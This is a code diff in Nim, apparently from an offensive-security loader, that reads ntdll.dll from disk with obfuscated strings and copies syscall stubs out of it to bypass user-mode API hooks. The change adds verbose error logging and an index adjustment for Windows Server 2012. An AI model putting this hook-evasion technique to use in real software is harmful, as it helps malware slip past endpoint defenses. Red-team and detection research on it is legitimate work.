@@ -234,9 +234,24 @@ when defined(GetSyscallStub):
             ntdllString = obf("C:\\windows\\system32\\ntdll.dll")
         when defined(DInvoke):
             file = MyCreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
+            when defined(verbose):
+                echo obf("CreateFileA Error Code: ") & $[GetLastError()]
             fileSize = MyGetFileSize(file, nil)
-            fileData = MyRtlAllocateHeap(cast[PVOID](MyGetProcessHeap()), 0, cast[SIZE_T](fileSize))
+            when defined(verbose):
+                echo obf("MyGetFileSize Error Code: ") & $[GetLastError()]
+            if (ws2k12):
+                fileData = HeapAlloc(GetProcessHeap(), 0, fileSize)
+            else:
+                fileData = MyRtlAllocateHeap(cast[PVOID](MyGetProcessHeap()), 0, cast[SIZE_T](fileSize))
+            when defined(verbose):
+                echo obf("MyRtlAllocateHeap Error Code: ") & $[GetLastError()]
             let success = MyReadFile(file, fileData, fileSize, addr bytesRead, nil)
+            when defined(verbose):
+                echo obf("MyReadFile Error Code: ") & $[GetLastError()]
+                if (success):
+                    echo obf("MyReadFile Success")
+                else:
+                    echo obf("MyReadFile Failed")
         else:
             file = CreateFileA(ntdllString, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullHandle)
             fileSize = GetFileSize(file, nil)
@@ -269,6 +284,10 @@ when defined(GetSyscallStub):
             var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
             var functionNameResolved: cstring = cast[cstring](functionNameVA)
             if (functionNameResolved == functionName):
+                if(ws2k12):
+                    # We adjust the functionVA by 7, as for some reason the functionVA is 7 ordinals off compared ntdll from disk to memory
+                    functionNameVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2 + 7], rdataSection))
+                    functionVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 8], textSection))
                 moveMemory(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
                 stubFound = 1
         return stubFound
